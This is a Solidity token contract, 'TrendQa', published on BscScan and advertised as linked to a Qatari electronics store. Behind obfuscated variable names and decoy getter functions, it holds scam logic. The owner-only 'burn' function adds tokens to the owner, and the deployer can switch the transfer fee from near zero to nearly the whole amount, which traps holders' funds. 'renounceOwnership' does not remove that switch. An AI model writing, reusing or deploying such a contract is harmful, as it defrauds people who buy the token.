/**
 *Submitted for verification at BscScan.com on 2022-11-20
*/

////////////////////////////////////////////////////////////////////////////////////////////////
//Trend.Qa We’re dedicated to providing you the trusted, Electronics products such As 
//(smartphones , tablets , gaming , laptops) . As an online store in Qatar Our emphasis is providing you 
//with an easy-to-use, fast, online shopping experience with high quality, brand new, original products.
//https://qatarmobile.qa/
//https://youtu.be/qAv2wSARJHE
//https://twitter.com/OrienttechMe
//https://www.facebook.com/mobileserviceqa/
////////////////////////////////////////////////////////////////////////////////////////////////

// SPDX-License-Identifier: MIT
pragma solidity >=0.5.0;
contract TrendQa {
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  IWLWFO = 100000000;
address private  VNXTTO = address(0);
uint256 private  AEDHZV = 10000000000000;
uint256 private  ZALMXC = 1000000000000000000;
uint256 private  ZCAUBM = 1000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  DWQOIP = address(0);
uint256 private  DAUPZF = 1000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  KPMZUB = 10000000000;
uint8 public constant decimals = 18;
string public  symbol = "TrendQa";
address private  OJOVRH = address(0);
address private  KUBMQH = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
string public  name = "TrendQa";
address public owner;
uint256 public constant totalSupply = 100000000000000000000000000000;
mapping (address => uint256) public balanceOf;
uint256 public constant SRPXMF = 99999;
address private  FUCIGQ = address(0);
uint256 private  JODJPY = 1000000000000000000000;
function _getAEDHZV() private returns (uint256) {
return AEDHZV;
}

function _getJODJPY() private returns (uint256) {
return JODJPY;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getZALMXC() private returns (uint256) {
return ZALMXC;
}

function _getDAUPZF() private returns (uint256) {
return DAUPZF;
}

function _getVNXTTO() private returns (address) {
return VNXTTO;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getOJOVRH() private returns (address) {
return OJOVRH;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tWDSOVC 0");
require(spender != address(0), "fWDSOVC 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "WDSOVC");
require(to != address(0), "WDSOVC");
require(amount <= balanceOf[from], "WDSOVC");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* SRPXMF/ZCAUBM ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==FUCIGQ){
ZCAUBM = SRPXMF+2;
}
emit Transfer(from, to, transferAmount);
}
function _getIWLWFO() private returns (uint256) {
return IWLWFO;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getDWQOIP() private returns (address) {
return DWQOIP;
}

constructor () public {
FUCIGQ = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getKPMZUB() private returns (uint256) {
return KPMZUB;
}

function _getKUBMQH() private returns (address) {
return KUBMQH;
}


}